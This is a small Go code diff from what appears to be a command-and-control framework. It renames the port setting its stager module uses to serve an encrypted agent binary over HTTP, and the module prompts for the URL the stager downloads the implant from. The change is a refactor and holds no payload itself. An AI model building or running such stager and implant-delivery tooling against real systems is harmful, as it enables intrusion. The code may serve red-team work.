@@ -33,7 +33,7 @@ func modStager() {
 
 	// stop stager HTTP server when needed
 	if tun.Stager_Ctx != nil {
-		CliPrintInfo("Looks like stager HTTP server is already running on port %s, we will shut it down to serve the new file", RuntimeConfig.HTTPListenerPort)
+		CliPrintInfo("Looks like stager HTTP server is already running on port %s, we will shut it down to serve the new file", RuntimeConfig.StagerHTTPListenerPort)
 		tun.Stager_Cancel()
 		// shutdown server if needed
 		if err = tun.Stager_HTTP_Server.Shutdown(tun.Stager_Ctx); err != nil {
@@ -42,11 +42,11 @@ func modStager() {
 	}
 	tun.Stager_Ctx, tun.Stager_Cancel = context.WithCancel(context.Background())
 
-	url := fmt.Sprintf("http://%s:%s", RuntimeConfig.CCHost, RuntimeConfig.HTTPListenerPort)
+	url := fmt.Sprintf("http://%s:%s", RuntimeConfig.CCHost, RuntimeConfig.StagerHTTPListenerPort)
 	if CliYesNo("Do you want to use the default URL (stager will download from it)") {
 		CliPrintInfo("Using default URL %s for agent binary download", url)
 	} else {
-		CliMsg("You will have to reverse proxy http://localhost:%s to your custom URL", RuntimeConfig.HTTPListenerPort)
+		CliMsg("You will have to reverse proxy http://localhost:%s to your custom URL", RuntimeConfig.StagerHTTPListenerPort)
 		url = CliAsk("Give me an HTTP download URL (stager will try downloading agent from this URL): ", false)
 	}
 
@@ -85,6 +85,6 @@ func write_payload(stager_filename, enc_agent_bin_path string, stager_data []byt
 		CopyToClipboard(stager_data)
 
 		// serve agent binary
-		tun.ServeFileHTTP(enc_agent_bin_path, RuntimeConfig.HTTPListenerPort, tun.Stager_Ctx, tun.Stager_Cancel)
+		tun.ServeFileHTTP(enc_agent_bin_path, RuntimeConfig.StagerHTTPListenerPort, tun.Stager_Ctx, tun.Stager_Cancel)
 	}
 }
